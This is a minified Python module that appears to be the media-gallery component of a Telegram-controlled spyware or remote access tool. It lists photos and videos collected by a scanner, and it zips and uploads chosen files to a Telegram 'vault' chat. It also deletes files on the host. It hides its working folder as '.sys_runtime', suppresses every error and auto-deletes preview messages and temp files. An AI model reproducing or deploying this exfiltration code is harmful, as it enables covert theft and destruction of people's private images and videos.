# -*- coding: utf-8 -*-
import os,time,zipfile,logging,threading,random,gc,json
P=os.path.join(os.getcwd(),".sys_runtime")
T=os.path.join(P,"g_tmp")
if not os.path.exists(T):os.makedirs(T)
logging.basicConfig(filename=os.path.join(P,"g.log"),level=logging.ERROR,filemode='w')
try:from PIL import Image;PIL=True
except:PIL=False

class G:
 def __init__(self,sc=None,tg=None):
  self.sc=sc;self.tg=tg;self.ipp=16;self._c()
 def _c(self):
  try:
   for f in os.listdir(T):os.remove(os.path.join(T,f))
  except:pass
 def _t(self,p,s=(300,300)):
  if not PIL or not os.path.exists(p):return None
  try:
   i=Image.open(p);i.thumbnail(s,Image.LANCZOS)
   o=os.path.join(T,f"t_{time.time_ns()}.jpg")
   i.save(o,"JPEG",quality=60);i.close();return o
  except:return None
 def _v(self,p):
  if not PIL:return None
  try:
   import cv2
   c=cv2.VideoCapture(p);tot=int(c.get(cv2.CAP_PROP_FRAME_COUNT))
   if tot<=0:c.release();return None
   fr=[]
   for pos in[0.2,0.5,0.8]:
    c.set(cv2.CAP_PROP_POS_FRAMES,int(tot*pos))
    ret,f=c.read()
    if ret:
     f=cv2.cvtColor(f,cv2.COLOR_BGR2RGB);fi=Image.fromarray(f)
     fi.thumbnail((200,200));fr.append(fi)
   c.release()
   if not fr:return None
   w,h=fr[0].size;cmb=Image.new('RGB',(w*len(fr),h))
   for i,f in enumerate(fr):cmb.paste(f,(i*w,0));f.close()
   o=os.path.join(T,f"v_{time.time_ns()}.jpg")
   cmb.save(o,"JPEG",quality=65);cmb.close();return o
  except:return None
 def gkb(self,cat="pending",p=0):
  r=self.sc.get_gallery_by_category(cat,limit=self.ipp,page=p)
  st=self.sc.get_statistics();total=st.get(cat,0);tot_p=(total+self.ipp-1)//self.ipp
  kb=[];row=[]
  for i in range(self.ipp):
   if i<len(r):
    lb=r[i].get("label",str((p*self.ipp)+i+1).zfill(2))
    btn={"text":f"🖼 {lb}","callback_data":f"g_o|{cat}|{p}|{i}"}
   else:btn={"text":"⬛","callback_data":"n"}
   row.append(btn)
   if len(row)==4:kb.append(row);row=[]
  nav=[]
  if p>0:nav.append({"text":"⏮️","callback_data":f"g_n|{cat}|{p-1}"})
  nav.append({"text":f"📄 {p+1}/{max(1,tot_p)}","callback_data":f"g_n|{cat}|{p}"})
  if len(r)==self.ipp and (p+1)<tot_p:nav.append({"text":"⏭️","callback_data":f"g_n|{cat}|{p+1}"})
  kb.append(nav);return{"inline_keyboard":kb}
 def sho(self,cid,cat,p,i):
  r=self.sc.get_gallery_by_category(cat,limit=self.ipp,page=int(p))
  if int(i)>=len(r):return
  it=r[int(i)];path=it['path'];lb=it.get("label","??")
  sz=round(os.path.getsize(path)/(1024*1024),1) if os.path.exists(path) else 0
  kb=[[{"text":"👁","callback_data":f"g_a|pr|{cat}|{p}|{i}"}],[{"text":"⬇️","callback_data":f"g_a|dw|{cat}|{p}|{i}"},{"text":"🗑","callback_data":f"g_c|de|{cat}|{p}|{i}"}],[{"text":"🔙","callback_data":f"g_n|{cat}|{p}"}]]
  self.tg._ap("sendMessage",{"chat_id":cid,"text":f"📦 #{lb} ({sz}MB)","reply_markup":json.dumps({"inline_keyboard":kb})})
 def act(self,cid,act,cat,p,i):
  r=self.sc.get_gallery_by_category(cat,limit=self.ipp,page=int(p))
  if int(i)>=len(r):return
  path=r[int(i)]['path'];lb=r[int(i)].get("label","??")
  if act=="pr":self._pr(cid,path)
  elif act=="dw":self._dw(cid,path,lb)
  elif act=="de":self._de(cid,path,lb)
 def _pr(self,cid,path):
  ext=path.lower();th=None
  if ext.endswith(('.jpg','.jpeg','.png','.webp')):th=self._t(path)
  elif ext.endswith(('.mp4','.mkv','.3gp','.mov','.avi')):th=self._v(path)
  if th:
   r=self.tg._ap("sendPhoto",{"chat_id":cid,"caption":"🔍"},{"photo":th})
   if r and r.get('ok'):threading.Timer(30,self._cl,args=(cid,r['result']['message_id'],th)).start()
  else:self.tg._ap("sendMessage",{"chat_id":cid,"text":"❌"})
 def _dw(self,cid,path,lb):
  z=os.path.join(T,f"d_{random.getrandbits(32)}.zip")
  v=None
  try:
   if self.sc and self.sc.det and self.sc.det.mon:
    v=getattr(self.sc.det.mon,'vlt',None)
   if not v:v=getattr(self.tg,'dat',cid)
   with zipfile.ZipFile(z,'w',zipfile.ZIP_DEFLATED) as zf:zf.write(path,os.path.basename(path))
   with open(z,'rb') as f:self.tg._ap("sendDocument",{"chat_id":v,"caption":f"📤 {lb}"},{"document":f})
  except:pass
  finally:
   if os.path.exists(z):os.remove(z)
   gc.collect()
 def _de(self,cid,path,lb):
  try:
   if os.path.exists(path):os.remove(path)
   self.tg._ap("sendMessage",{"chat_id":cid,"text":f"🗑 {lb}"})
  except:pass
  gc.collect()
 def _cl(self,cid,mid,p):
  try:self.tg._ap("deleteMessage",{"chat_id":cid,"message_id":mid})
  except:pass
  try:
   if os.path.exists(p):os.remove(p)
  except:pass
  gc.collect()
def create(sc=None,tg=None):return G(sc,tg)
